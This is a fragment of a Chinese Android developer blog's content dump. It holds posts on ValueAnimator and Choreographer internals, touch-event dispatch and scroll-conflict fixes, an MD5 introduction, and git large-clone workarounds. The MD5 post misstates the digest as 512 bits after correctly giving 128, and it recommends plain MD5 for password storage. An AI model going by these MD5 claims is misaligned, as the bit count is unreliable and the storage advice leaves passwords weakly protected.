return; &#125; mCallbacksRunning = true; ... &#125; try &#123; Trace.traceBegin(Trace.TRACE_TAG_VIEW, CALLBACK_TRACE_TITLES[callbackType]); for (CallbackRecord c = callbacks; c != null; c = c.next) &#123; if (DEBUG_FRAMES) &#123; Log.d(TAG, \"RunCallback: type=\" + callbackType + \", action=\" + c.action + \", token=\" + c.token + \", latencyMillis=\" + (SystemClock.uptimeMillis() - c.dueTime)); &#125; c.run(frameTimeNanos); &#125; &#125; finally &#123; synchronized (mLock) &#123; mCallbacksRunning = false; do &#123; final CallbackRecord next = callbacks.next; recycleCallbackLocked(callbacks); callbacks = next; &#125; while (callbacks != null); &#125; Trace.traceEnd(Trace.TRACE_TAG_VIEW); &#125;&#125;public CallbackRecord extractDueCallbacksLocked(long now) &#123; CallbackRecord callbacks = mHead; if (callbacks == null || callbacks.dueTime &gt; now) &#123; return null; &#125; CallbackRecord last = callbacks; CallbackRecord next = last.next; while (next != null) &#123; if (next.dueTime &gt; now) &#123; last.next = null; break; &#125; last = next; next = next.next; &#125; mHead = next; return callbacks;&#125;private static final class CallbackRecord &#123; public CallbackRecord next; public long dueTime; public Object action; // Runnable or FrameCallback public Object token; public void run(long frameTimeNanos) &#123; if (token == FRAME_CALLBACK_TOKEN) &#123; ((FrameCallback)action).doFrame(frameTimeNanos); &#125; else &#123; ((Runnable)action).run(); &#125; &#125;&#125; 可以看到该方法首先调用了FrameInfo#extractDueCallbacksLocked，取出特定类型的已经到达指定时间的链表然后直接调用run方法，执行相应的帧回调操作对于属性动画而言，这里的回调是AnimationHandler#mFrameCallback，因此会执行doFrame方法： 12345678910111213141516171819202122232425262728293031323334353637private final Choreographer.FrameCallback mFrameCallback = new Choreographer.FrameCallback() &#123; @Override public void doFrame(long frameTimeNanos) &#123; doAnimationFrame(getProvider().getFrameTime()); if (mAnimationCallbacks.size() &gt; 0) &#123; getProvider().postFrameCallback(this); &#125; &#125;&#125;;@Overridepublic long getFrameTime() &#123; return mChoreographer.getFrameTime();&#125;private void doAnimationFrame(long frameTime) &#123; long currentTime = SystemClock.uptimeMillis(); final int size = mAnimationCallbacks.size(); for (int i = 0; i &lt; size; i++) &#123; final AnimationFrameCallback callback = mAnimationCallbacks.get(i); if (callback == null) &#123; continue; &#125; if (isCallbackDue(callback, currentTime)) &#123; callback.doAnimationFrame(frameTime); if (mCommitCallbacks.contains(callback)) &#123; getProvider().postCommitCallback(new Runnable() &#123; @Override public void run() &#123; commitAnimationFrame(callback, getProvider().getFrameTime()); &#125; &#125;); &#125; &#125; &#125; cleanUpList();&#125; doFrame方法会调用doAnimationFrame方法来处理当前线程中所有属性动画的帧回调，并通过getFrameTime来获取Choreographer提供的当前帧时间在doAnimationFrame方法中，找到所有到达执行时间的AnimationFrameCallback，调用其doAnimationFrame方法由于属性动画ValueAnimator就实现了AnimationFrameCallback接口，这里我们直接看下ValueAnimator#doAnimationFrame： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public final boolean doAnimationFrame(long frameTime) &#123; ... if (mLastFrameTime &lt; 0) &#123; if (mSeekFraction &gt;= 0) &#123; long seekTime = (long) (getScaledDuration() * mSeekFraction); mStartTime = frameTime - seekTime; mSeekFraction = -1; &#125; mStartTimeCommitted = false; // allow start time to be compensated for jank &#125; mLastFrameTime = frameTime; // The frame time might be before the start time during the first frame of // an animation. The \"current time\" must always be on or after the start // time to avoid animating frames at negative time intervals. In practice, this // is very rare and only happens when seeking backwards. final long currentTime = Math.max(frameTime, mStartTime); boolean finished = animateBasedOnTime(currentTime); ... return finished;&#125;boolean animateBasedOnTime(long currentTime) &#123; boolean done = false; if (mRunning) &#123; ... animateValue(currentIterationFraction); &#125; return done;&#125;@CallSupervoid animateValue(float fraction) &#123; fraction = mInterpolator.getInterpolation(fraction); mCurrentFraction = fraction; int numValues = mValues.length; for (int i = 0; i &lt; numValues; ++i) &#123; mValues[i].calculateValue(fraction); &#125; if (mUpdateListeners != null) &#123; int numListeners = mUpdateListeners.size(); for (int i = 0; i &lt; numListeners; ++i) &#123; mUpdateListeners.get(i).onAnimationUpdate(this); &#125; &#125;&#125; 在doAnimationFrame方法中，这里我们省略了一系列各种开始停止暂停状态的处理，可以看到计算出时间后，调用了animateBasedOnTime方法执行动画然后在animateBasedOnTime方法中，我们计算出来当前实际的进度currentIterationFraction，并传递给了animateValue执行动画在animateValue方法中，通过插值器就算出属性变化的实际量之后，调用了onAnimationUpdate方法，执行动画更新的回调 至此，属性动画执行的流程至此结束 api15的ValueAnimator源码我们上面分析的源码是api28的版本，可以看到ValueAnimator属性动画的执行流程实现是依赖于Choreographer来进行帧回调的然而，我们经过api的接口查询可以发现，ValueAnimator属性动画是api11加入的，而Choreographer则是api16加入的https://developer.android.com/reference/android/animation/ValueAnimatorhttps://developer.android.com/reference/android/view/Choreographer 那么在Choreographer加入之前，ValueAnimator属性动画的执行流程又是怎样的呢？ 这里我们找到了api15的ValueAnimator源码： 12345678910111213141516171819202122232425262728private void start(boolean playBackwards) &#123; if (Looper.myLooper() == null) &#123; throw new AndroidRuntimeException(\"Animators may only be run on Looper threads\"); &#125; ... sPendingAnimations.get().add(this); ... AnimationHandler animationHandler = sAnimationHandler.get(); if (animationHandler == null) &#123; animationHandler = new AnimationHandler(); sAnimationHandler.set(animationHandler); &#125; animationHandler.sendEmptyMessage(ANIMATION_START);&#125;@Overridepublic void start() &#123; start(false);&#125;// The per-thread set of animations to be started on the next animation frameprivate static final ThreadLocal&lt;ArrayList&lt;ValueAnimator&gt;&gt; sPendingAnimations = new ThreadLocal&lt;ArrayList&lt;ValueAnimator&gt;&gt;() &#123; @Override protected ArrayList&lt;ValueAnimator&gt; initialValue() &#123; return new ArrayList&lt;ValueAnimator&gt;(); &#125; &#125;; 从start方法可以看到，对于线程必须有Looper的限制还是有的不同的的地方在于，这里首先把自己加入到了sPendingAnimations线程独有的列表中，然后直接使用了AnimationHandler来发送了一条ANIMATION_START的消息这里我们继续看下AnimationHandler的代码： 12345678910111213141516171819202122232425262728293031323334353637383940private static class AnimationHandler extends Handler &#123; @Override public void handleMessage(Message msg) &#123; boolean callAgain = true; ArrayList&lt;ValueAnimator&gt; animations = sAnimations.get(); ArrayList&lt;ValueAnimator&gt; delayedAnims = sDelayedAnims.get(); switch (msg.what) &#123; // TODO: should we avoid sending frame message when starting if we // were already running? case ANIMATION_START: ArrayList&lt;ValueAnimator&gt; pendingAnimations = sPendingAnimations.get(); if (animations.size() &gt; 0 || delayedAnims.size() &gt; 0) &#123; callAgain = false; &#125; // pendingAnims holds any animations that have requested to be started // We're going to clear sPendingAnimations, but starting animation may // cause more to be added to the pending list (for example, if one animation // starting triggers another starting). So we loop until sPendingAnimations // is empty. while (pendingAnimations.size() &gt; 0) &#123; ArrayList&lt;ValueAnimator&gt; pendingCopy = (ArrayList&lt;ValueAnimator&gt;) pendingAnimations.clone(); pendingAnimations.clear(); int count = pendingCopy.size(); for (int i = 0; i &lt; count; ++i) &#123; ValueAnimator anim = pendingCopy.get(i); // If the animation has a startDelay, place it on the delayed list if (anim.mStartDelay == 0) &#123; anim.startAnimation(); &#125; else &#123; delayedAnims.add(anim); &#125; &#125; &#125; // fall through to process first frame of new animations ... &#125; &#125;&#125; AnimationHandler在接到ANIMATION_START的消息后，首先从sPendingAnimations列表中读取出所有等待执行的属性动画然后调用了他们的startAnimation方法： 123456789101112131415161718/** * Called internally to start an animation by adding it to the active animations list. Must be * called on the UI thread. */private void startAnimation() &#123; initAnimation(); sAnimations.get().add(this); if (mStartDelay &gt; 0 &amp;&amp; mListeners != null) &#123; // Listeners were already notified in start() if startDelay is 0; this is // just for delayed animations ArrayList&lt;AnimatorListener&gt; tmpListeners = (ArrayList&lt;AnimatorListener&gt;) mListeners.clone(); int numListeners = tmpListeners.size(); for (int i = 0; i &lt; numListeners; ++i) &#123; tmpListeners.get(i).onAnimationStart(this); &#125; &#125;&#125; 可以看到startAnimation一个是把动画自身加入到sAnimations线程独有的列表中，另外就是处理了一些动画开始相关的回调我们在这里并没有看到帧回调相关的代码，于是我们再回到AnimationHandler#handleMessage方法中寻找答案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768private static class AnimationHandler extends Handler &#123; @Override public void handleMessage(Message msg) &#123; boolean callAgain = true; ArrayList&lt;ValueAnimator&gt; animations = sAnimations.get(); ArrayList&lt;ValueAnimator&gt; delayedAnims = sDelayedAnims.get(); switch (msg.what) &#123; case ANIMATION_START: ... case ANIMATION_FRAME: ... // Now process all active animations. The return value from animationFrame() // tells the handler whether it should now be ended int numAnims = animations.size(); int i = 0; while (i &lt; numAnims) &#123; ValueAnimator anim = animations.get(i); if (anim.animationFrame(currentTime)) &#123; endingAnims.add(anim); &#125; if (animations.size() == numAnims) &#123; ++i; &#125; else &#123; // An animation might be canceled or ended by client code // during the animation frame. Check to see if this happened by // seeing whether the current index is the same as it was before // calling animationFrame(). Another approach would be to copy // animations to a temporary list and process that list instead, // but that entails garbage and processing overhead that would // be nice to avoid. --numAnims; endingAnims.remove(anim); &#125; &#125; if (endingAnims.size() &gt; 0) &#123; for (i = 0; i &lt; endingAnims.size(); ++i) &#123; endingAnims.get(i).endAnimation(); &#125; endingAnims.clear(); &#125; // If there are still active or delayed animations, call the handler again // after the frameDelay if (callAgain &amp;&amp; (!animations.isEmpty() || !delayedAnims.isEmpty())) &#123; sendEmptyMessageDelayed(ANIMATION_FRAME, Math.max(0, sFrameDelay - (AnimationUtils.currentAnimationTimeMillis() - currentTime))); &#125; break; &#125; &#125;&#125; boolean animationFrame(long currentTime) &#123; boolean done = false; ... switch (mPlayingState) &#123; case RUNNING: case SEEKED: ... animateValue(fraction); break; &#125; return done;&#125; 在handleMessage方法中，我们这次看下ANIMATION_FRAME类型的消息，可以看到处理这种类型的消息时，会调用animationFrame方法而animationFrame方法又会计算出动画的进度，调用我们之前提到的animateValue方法然后在最后由发送了一遍ANIMATION_FRAME类型的消息，开始了新一轮的消息处理综上不难得知，ANIMATION_FRAME类型的消息就是帧回调信号的消息 值得注意的一点是，处理ANIMATION_START类型的消息时，handleMessage方法并不会break掉，因此第一个ANIMATION_FRAME类型的消息可以理解为是属性动画调用start后发出的 综上所述，api15的ValueAnimator动画执行依赖的是Handler发送消息实现的","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"View的事件分发机制和滑动冲突解决方案","slug":"View的事件分发机制和滑动冲突解决方案","date":"2019-11-14T07:48:07.000Z","updated":"2020-05-11T07:23:44.751Z","comments":true,"path":"2019/11/14/View的事件分发机制和滑动冲突解决方案/","link":"","permalink":"https://superxlcr.github.io/2019/11/14/View的事件分发机制和滑动冲突解决方案/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/057832528bdd 这篇文章会先讲Android中View的事件分发机制，然后再介绍Android滑动冲突的形成原因并给出解决方案。因水平有限，讲的不会太过深入，只希望各位看了之后对事件分发机制的流程有个大概的概念，并且以后能自己解决有关滑动冲突的问题，用语浅薄，文笔生疏，见谅。 View的事件分发机制View的事件分发机制说白了就是点击事件的传递，也就是一个Down事件,若干个Move事件，一个Up事件构成的事件序列的传递。当你手指按了屏幕，点击事件就会遵循Activity-&gt;Window-&gt;View这一顺序传递。这一传递过程有三个重要的方法，分别是： boolean dispatchTouchEcent(MotionEvent ev), boolean onInterceptTouchEvent(MotionEvent event), boolean onTouchEvent(MotionEvent event)先一个一个简单介绍下： dispatchTouchEcent：只要事件传递到了当前View,那么dispatchTouchEcent方法就一定会被调用。返回结果表示是否消耗当前事件。 onInterceptTouchEvent：在dispatchTouchEcent方法内部调用此方法，用来判断是否拦截某个事件。如果当前View拦截了某个事件，那么在这同一个事件序列中，此方法不会再次被调用。返回结果表示是否拦截当前事件。 onTouchEvent：在dispatchTouchEcent方法内调用此方法，用来处理事件。返回结果表示是否处理当前事件，如果不处理，那么在同一个事件序列里面，当前View无法再收到后续的事件。上面的解释听起来比较抽象，我们可以用一段伪代码来表示上面三个方法的关系： 12345678910public boolean dispatchTouchEvent(MotionEvent ev)&#123; boolean consum = false; if(onInterceptTouchEvent(ev))&#123; consum = onTouchEvent(ev); &#125;else&#123; consum = child.dispatchTouchEvent(ev); &#125; return consum;&#125; 上面代码很好的解释了三个方法之间的关系，我们也可以从代码中大致摸索到事件传递的顺序规则：当点击事件传递到根ViewGroup里，会执行dispatchTouchEvent，在其内部会先调用onInterceptTouchEvent询问是否拦截事件，若拦截，则执行onTouchEvent方法处理这个事件；若不拦截，则执行子元素的dispatchTouchEvent，进入向下分发的传递，直到事件被处理。在处理一个事件的时候，是有优先级的，如果设置了OnTouchListener,会先执行其内部的onTouch方法，这时若onTouch方法返回true，那么表示事件被处理了，不会向下传递了；如果返回了false，那么事件会继续传递给onTouchEvent方法处理,在onTouchEvent方法中如果当前设置了OnClickListener,那么就会调用其onClick方法。所以其优先级为：OnTouchListen&gt;onTouchEvent&gt;OnClickListen。这里有一种情况，如果一个View的onTouchEvent返回了false,那么它父容器的onTouchEvent方法将会被调用。我们写个例子来试一下： 12345@Overridepublic boolean onTouchEvent(MotionEvent event) &#123; Toast.makeText(mContext, \"Button\", Toast.LENGTH_SHORT).show(); return false;&#125; 先自定义一个Button,重写其onTouchEvent方法返回false。在自定义一个MyTouchView作为父布局。效果如下： 大家可以自己试试。既然如此，在开头我们说过事件的传递顺序是Activity-&gt;Window-&gt;View,所以如果所有的元素都返回了false,那么最后事件就会再次传递到Activity里，由Activity的onTouchEvent方法来处理。《Android开发艺术探索》这本书里总结了11条关于事件传递的结论： 同一个事件序列是指手机接触屏幕那一刻起，到离开屏幕那一刻结束，有一个down事件，若干个move事件，一个up事件构成。 某个View一旦决定拦截事件，那么这个事件序列之后的事件都会由它来处理，并且不会再调用onInterceptTouchEvent。 正常情况下，一个事件序列只能被一个View拦截并消耗。这个原因可以参考第2条，因为一旦拦截了某个事件，那么这个事件序列里的其他事件都会交给这个View来处理，所以同一事件序列中的事件不能分别由两个View同时处理，但是我们可以通过特殊手段做到，比如一个View将本该自己处理的事件通过onTouchEvent强行传递给其他View处理。 一个View如果开始处理事件，如果它不处理down事件（onTouchEvent里面返回了false）,那么这个事件序列的其他事件就不会交给它来继续处理了，而是会交给它的父元素去处理。 如果一个View处理了down事件，却没有处理其他事件，那么这些事件不会交给父元素处理，并且这个View还能继续受到后续的事件。而这些未处理的事件，最终会交给Activity来处理。 ViewGroup的onInterceptToucheEvent默认返回false,也就是默认不拦截事件。 View没有InterceptTouchEvent方法，如果有事件传过来，就会直接调用onTouchEvent方法。 View的onTouchEvent方法默认都会消耗事件，也就是默认返回true,除非他是不可点击的（longClickable和clickable同时为false）。 View的enable属性不会影响onTouchEvent的默认返回值。就算一个View是不可见的，只要他是可点击的（clickable或者longClickable有一个为true）,它的onTouchEvent默认返回值也是true。 onClick方法会执行的前提是当前View是可点击的，并且它收到了down和up事件。 事件传递过程是由外向内的，也就是事件会先传给父元素在向下传递给子元素。但是子元素可以通过requestDisallowInterceptTouchEvent来干预父元素的分发过程，但是down事件除外（因为down事件方法里，会清除所有的标志位）。 滑动冲突介绍完了事件分发机制的基本流程，我们来看看滑动冲突。滑动冲突的基本形式分为两种，其他复杂的滑动冲突都可以拆成这两种基本形式： 外部滑动方向与内部方向不一致。 外部方向与内部方向一致。先来看第一种，比如你用ViewPaper和Fragment搭配，而Fragment里往往是一个竖直滑动的ListView,这种情况是就会产生滑动冲突,但是由于ViewPaper本身已经处理好了滑动冲突，所以我们无需考虑，不过若是换成ScrollView，我们就得自己处理滑动冲突了。图示如下： 再看看第二种，这种情况下，因为内部和外部滑动方向一致，系统会分不清你要滑动哪个部分，所以会要么只有一层能滑动，要么两层一起滑动得很卡顿。图示如下: 对于这两种情况，我们处理的方法也很简单，并且都有相应的套路。 第一种的冲突主要是一个横向一个竖向的，所以我们只要判断滑动方向是竖向还是横向的，再让对应的View滑动即可。判断的方法有很多，比如竖直距离与横向距离的大小比较；滑动路径与水平形成的夹角等等。 对于这种情况，比较特殊，我们没有通用的规则，得根据业务逻辑来得出相应的处理规则。举个最常见的例子，ListView下拉刷新，需要ListView自身滑动，但是当滑动到头部时需要ListView和Header一起滑动，也就是整个父容器的滑动。如果不处理好滑动冲突，就会出现各种意想不到情况。 滑动冲突的处理方法滑动冲突的拦截方法有两种： 一种是让事件都经过父容器的拦截处理，如果父容器需要则拦截，如果不需要则不拦截，成为外部拦截法，其伪代码如下: 12345678910111213141516171819202122232425262728public boolean onInterceptTouchEvent(MotionEvent event) &#123; boolean intercepted = false; int x = (int)event.getX(); int y = (int)event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; intercepted = false; break; &#125; case MotionEvent.ACTION_MOVE: &#123; if (满足父容器的拦截要求) &#123; intercepted = true; &#125; else &#123; intercepted = false; &#125; break; &#125; case MotionEvent.ACTION_UP: &#123; intercepted = false; break; &#125; default: break; &#125; mLastXIntercept = x; mLastYIntercept = y; return intercepted;&#125; 在这里，首先down事件父容器必须返回false ，因为若是返回true，也就是拦截了down事件，那么后续的move和up事件就都会传递给父容器，子元素就没有机会处理事件了。其次是up事件也返回了false，一是因为up事件对父容器没什么意义，其次是因为若事件是子元素处理的，却没有收到up事件会让子元素的onClick事件无法触发。另一种是父容器不拦截任何事件，将所有事件传递给子元素，如果子元素需要则消耗掉，如果不需要则通过requestDisallowInterceptTouchEvent方法交给父容器处理，称为内部拦截法，使用起来稍显麻烦。伪代码如下： 首先我们需要重写子元素的dispatchTouchEvent方法： 1234567891011121314151617181920212223242526272829 @Overridepublic boolean dispatchTouchEvent(MotionEvent event) &#123; int x = (int) event.getX(); int y = (int) event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; parent.requestDisallowInterceptTouchEvent(true); break; &#125; case MotionEvent.ACTION_MOVE: &#123; int deltaX = x - mLastX; int deltaY = y - mLastY; if (父容器需要此类点击事件) &#123; parent.requestDisallowInterceptTouchEvent(false); &#125; break; &#125; case MotionEvent.ACTION_UP: &#123; break; &#125; default: break; &#125; mLastX = x; mLastY = y; return super.dispatchTouchEvent(event);&#125; 然后修改父容器的onInterceptTouchEvent方法： 12345678910@Overridepublic boolean onInterceptTouchEvent(MotionEvent event) &#123; int action = event.getAction(); if (action == MotionEvent.ACTION_DOWN) &#123; return false; &#125; else &#123; return true; &#125;&#125; 这里父容器也不能拦截down事件。看代码看不出所以然，我们通过实例来看看滑动冲突是怎么样的。 外部滑动方向与内部方向不一致我们先模拟第一种场景，内外滑动方向不一致，我们先自定义一个父控件，让其可以左右滑动，类似于ViewPaper： 然后将里面换成三个ListView: 可以看到左右滑动失效了，说明确实冲突了。那么我们就来解决一下，首先我们要明白滑动规则是什么，这个例子中如果我们竖直滑动就让ListView消耗事件，水平滑动就让我们自定义的父容器滑动。知道了这个我们只需要将其替换到之前伪代码里的拦截条件里即可。先用外部拦截法： 123456789101112131415161718192021222324252627282930313233343536373839 @Override public boolean onInterceptTouchEvent(MotionEvent event) &#123; boolean intercepted = false; int x = (int) event.getX(); int y = (int) event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; Log.d(TAG, \"onInterceptTouchEvent: ACTION_DOWN\"); intercepted = false; break; &#125; case MotionEvent.ACTION_MOVE: &#123; Log.d(TAG, \"onInterceptTouchEvent: ACTION_MOVE\"); int deltaX = x - mLastXIntercept; int deltaY = y - mLastYIntercept; if (Math.abs(deltaX) &gt; Math.abs(deltaY)) &#123; intercepted = true; &#125; else &#123; intercepted = false; &#125; break; &#125; case MotionEvent.ACTION_UP: &#123; intercepted = false; break; &#125; default: break; &#125; Log.d(TAG, \"intercepted=\" + intercepted); mLastX = x; mLastY = y; mLastXIntercept = x; mLastYIntercept = y; return intercepted;&#125; 这里我们判断横向滑动的距离与竖直滑动距离的长短。若是竖直滑动的长，则判断为竖直滑动，那么就是ListView的滑动，就将intercepted置为false，让父容器不拦截，交由子元素ListView处理。若是横向，则intercepted置为true，交由父容器处理。效果如下： 接下来看看内部拦截法： 先自定义一个MyListView继承ListView，重写其dispatchTouchEvent方法： 123456789101112131415161718192021222324252627282930@Overridepublic boolean dispatchTouchEvent(MotionEvent event) &#123; int x = (int) event.getX(); int y = (int) event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; mHorizontalScrollViewEx.requestDisallowInterceptTouchEvent(true); break; &#125; case MotionEvent.ACTION_MOVE: &#123; int deltaX = x - mLastX; int deltaY = y - mLastY; Log.d(TAG, \"dx:\" + deltaX + \" dy:\" + deltaY); if (Math.abs(deltaX) &gt; Math.abs(deltaY)) &#123; mHorizontalScrollViewEx.requestDisallowInterceptTouchEvent(false); &#125; break; &#125; case MotionEvent.ACTION_UP: &#123; break; &#125; default: break; &#125; mLastX = x; mLastY = y; return super.dispatchTouchEvent(event);&#125; 再重写外部父容器的oninterceptTouchEvent方法: 12345678910111213@Overridepublic boolean onInterceptTouchEvent(MotionEvent event) &#123; int x = (int) event.getX(); int y = (int) event.getY(); int action = event.getAction(); if (action == MotionEvent.ACTION_DOWN) &#123; mLastX = x; mLastY = y; return false; &#125; else &#123; return true; &#125;&#125; 效果和外部拦截法一样。 外部方向与内部方向一致接下来看看同方向的滑动冲突,这里我们用一个竖直的ScrollView嵌套一个ListView做例子。首先看看没有解决滑动冲突的时候是咋样的： 我们看到只要ScrollView可以滑动，内部的ListView是不能滑动的。那我们现在来解决这个问题，同向滑动冲突和与不同向滑动冲突不一样，得根据实际的需求来确定拦截的规则。这里我们的需求是当ListView滑到顶部了，并且继续向下滑就让ScrollView拦截掉；当ListView滑到底部了，并且继续向下滑，就让ScrollView拦截掉，其余时候都交给ListView自身处理事件。 首先用外部拦截法，我们需要重写ScrollView的onInterceptTouchEvent方法，代码如下: 123456789101112131415161718192021222324252627282930313233343536@Overridepublic boolean onInterceptTouchEvent(MotionEvent event) &#123; boolean intercepted = false; int y = (int) event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; nowY = y; intercepted = super.onInterceptTouchEvent(event); break; &#125; case MotionEvent.ACTION_MOVE: &#123; if(mListView.getFirstVisiblePosition()==0 &amp;&amp; y&gt;nowY)&#123; intercepted = true; break; &#125; else if(mListView.getLastVisiblePosition()==mListView.getCount()-1 &amp;&amp; y&lt;nowY)&#123; intercepted = true; break; &#125; intercepted = false; break; &#125; case MotionEvent.ACTION_UP: &#123; intercepted = false; break; &#125; default: break; &#125; return intercepted;&#125; 这里我们看到Down事件里我们并没有返回false而是返回了super.onInterceptTouchEvent(event),这是因为ScrollView在Down方法时需要初始化一些参数如果我们直接返回false,会导致滑动出现问题。并且前面说过ViewGroup 的onInterceptTouchEvent方法是默认返回false的，所以我们这里直接返回super方法即可。 处理了滑动冲突后效果如下： 接下来看看内部拦截法： 先重写ScrollView的onInterceptTouchEvent方法，让其拦截除了Down事件以外的其他方法： 12345678910111213@Override public boolean onInterceptTouchEvent(MotionEvent event) &#123; int x = (int) event.getX(); int y = (int) event.getY(); int action = event.getAction(); if (action == MotionEvent.ACTION_DOWN) &#123; mLastX = x; mLastY = y; return super.onInterceptTouchEvent(event); &#125; else &#123; return true; &#125; &#125; 在重写ListView的dispatchTouchEvent方法，规则已经说明过了： 123456789101112131415161718192021222324252627282930313233 @Overridepublic boolean dispatchTouchEvent(MotionEvent event) &#123; int y = (int) event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; nowY = y; mHorizontalScrollViewEx2.requestDisallowInterceptTouchEvent(true); break; &#125; case MotionEvent.ACTION_MOVE: &#123; if(this.getFirstVisiblePosition()==0 &amp;&amp; y&gt;nowY)&#123; mHorizontalScrollViewEx2.requestDisallowInterceptTouchEvent(false); break; &#125; else if(this.getLastVisiblePosition()==this.getCount()-1 &amp;&amp; y&lt;nowY)&#123; mHorizontalScrollViewEx2.requestDisallowInterceptTouchEvent(false); break; &#125; mHorizontalScrollViewEx2.requestDisallowInterceptTouchEvent(true); break; &#125; case MotionEvent.ACTION_UP: &#123; break; &#125; default: break; &#125; return super.dispatchTouchEvent(event);&#125; 最终效果和外部拦截法一样。好了，这篇文章到此结束，希望各位看了能对事件分发机制有个大致的了解，并且遇到了滑动冲突的问题能够迎刃而解。谢谢忍受我的文章。 后记2月17号更新：感谢 @ShadowXv所指出的问题，我已改正，改正如下： 将listView是否滑动到顶部或者底部的判断改为 1234567891011121314151617public boolean isBottom(final ListView listView) &#123; boolean result=false; if (listView.getLastVisiblePosition() == (listView.getCount() - 1)) &#123; final View bottomChildView = listView.getChildAt(listView.getLastVisiblePosition() - listView.getFirstVisiblePosition()); result= (listView.getHeight()&gt;=bottomChildView.getBottom()); &#125;; return result; &#125; public boolean isTop(final ListView listView) &#123; boolean result=false; if(listView.getFirstVisiblePosition()==0)&#123; final View topChildView = listView.getChildAt(0); result=topChildView.getTop()==0; &#125; return result ; &#125; 那么onInterceptTouchEvent方法也该改为如下所示： 123456789101112131415161718192021222324252627282930313233343536@Override public boolean onInterceptTouchEvent(MotionEvent event) &#123; boolean intercepted = false; int y = (int) event.getY(); switch (event.getAction()) &#123; case MotionEvent.ACTION_DOWN: &#123; nowY = y; intercepted = super.onInterceptTouchEvent(event); break; &#125; case MotionEvent.ACTION_MOVE: &#123; if(isTop(mListView) &amp;&amp; y&gt;nowY)&#123; intercepted = true; break; &#125; else if(isBottom(mListView) &amp;&amp; y&lt;nowY)&#123; intercepted = true; break; &#125; intercepted = false; break; &#125; case MotionEvent.ACTION_UP: &#123; intercepted = false; break; &#125; default: break; &#125; return intercepted; &#125; 内部拦截法也是将判断条件换一下就可以了，这里就不贴代码了。。。最后再一次感谢指出问题！","categories":[],"tags":[]},{"title":"md5介绍","slug":"md5介绍","date":"2019-11-03T03:00:11.000Z","updated":"2020-05-11T07:23:44.780Z","comments":true,"path":"2019/11/03/md5介绍/","link":"","permalink":"https://superxlcr.github.io/2019/11/03/md5介绍/","excerpt":"","text":"最近博主在处理一些异常上报相关的需求，由于异常上报的日志字数是有限的，因此在参考回顾一些相关的摘要算法在此，整理一下需求中此次用到的md5算法 md5算法介绍md5算法全称：MD5信息摘要算法（英语：MD5 Message-Digest Algorithm）是一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致 md5算法主要有以下特点： 通常情况下，不同明文md5计算后的密文不相同 计算速度快，加密速度快，不需要秘钥 不可逆 md5算法一般有以下用途： 密码管理，用md5密文代替密码保存至数据库，防止数据库破解后密码泄漏 数字签名，验证身份 校验信息，防止内容被篡改 虽然现在已经有人证明了md5是并不安全的，可以被破解的，但对于安全性要求不是特别高的一般场景而言，我们还是可以选用md5算法 以上内容搬运自百度百科详情参考：https://baike.baidu.com/item/MD5/212708?fr=aladdin md5算法Android实现主要通过系统预置的java.security.MessageDigest接口来实现： 12345678910111213141516171819202122public synchronized static String getMd5(String src) &#123; try &#123; MessageDigest md = MessageDigest.getInstance(\"MD5\"); md.update(src.getBytes()); return bytesToHex(md.digest()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return null;&#125;private static String bytesToHex(byte[] bytes) &#123; StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; bytes.length; i++) &#123; String hex = Integer.toHexString(0xFF &amp; bytes[i]); if (hex.length() == 1) &#123; sb.append('0'); &#125; sb.append(hex); &#125; return sb.toString();&#125; md5密文计算后的输出都是512bit的，即长度为32的16进制字符串 32位、16位md5输出md5密文的输出除了区分大小写以外，还有32位与16位的分别上面说到md5密文的输出都是32位的其实16位的md5密文就是32位密文的第9位到第24位的部分代码表示如下： 1String md5_16 = md5_32.substring(8, 24);","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"git拉取大工程项目RPC failed处理","slug":"git拉取大工程项目RPC-failed处理","date":"2019-09-03T10:15:35.000Z","updated":"2020-05-11T07:23:44.771Z","comments":true,"path":"2019/09/03/git拉取大工程项目RPC-failed处理/","link":"","permalink":"https://superxlcr.github.io/2019/09/03/git拉取大工程项目RPC-failed处理/","excerpt":"","text":"最近博主在拉取某个大项目的时候遇到了下面的错误： 1error: RPC failed; curl 18 transfer closed with outstanding read data remaining 在网上找了一波资料后，发现问题出在项目文件太多太大了网上总结的解决方案主要有以下三种： 加大缓存区1git config --global http.postBuffer 524288000 这个大约是500M，不过博主试了更大的数值，依旧没有任何效果，估计是项目太大了 换协议12git clone https://github.com/flutter/flutter.git git clone git://github.com/flutter/flutter.git 即clone http方式换成SSH的方式，即 https:// 改为 git://可惜的是，博主拉取代码的gitlab并不支持ssh的方式 只拷贝部分代码1git clone https://github.com/flutter/flutter.git --depth 1 我们可以在clone指令上使用depth参数，来控制此次拷贝的深度–depth 1的含义是复制深度为1，就是每个文件只取最近一次提交，不是整个历史版本官方说明如下： 12--depth &lt;depth&gt;Create a shallow clone with a history truncated to the specified number of commits. Implies --single-branch unless --no-single-branch is given to fetch the histories near the tips of all branches. If you want to clone submodules shallowly, also pass --shallow-submodules. 不过值得注意的是这种方式拷贝下来的仓库是个shallow版本的，即浅拷贝版本的这种shallow版本的仓库是不允许我们进行push代码的因此当我们想要把仓库变回一个平时正常的仓库时，我们需要使用unshallow指令，把剩余的历史记录拉下来： 1git fetch --unshallow 